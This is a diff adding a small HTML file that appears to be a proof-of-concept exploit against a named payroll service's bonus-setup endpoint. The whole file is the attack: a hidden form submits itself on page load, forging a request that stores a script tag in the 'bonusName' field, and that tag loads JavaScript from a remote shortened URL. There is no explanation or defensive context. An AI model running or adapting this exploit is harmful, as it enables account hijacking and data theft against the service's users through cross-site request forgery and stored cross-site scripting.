@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <form id="xss" action="https://payroll.razorpay.com/bonusTypeSetup" method="POST">
+      <input type="hidden" name="bonusName" value='<script src=//rb.gy/ei8ofd></script>'>
+    </form>
+
+    <script>
+      document.getElementById('xss').submit();
+    </script>
+  </body>
+</html>
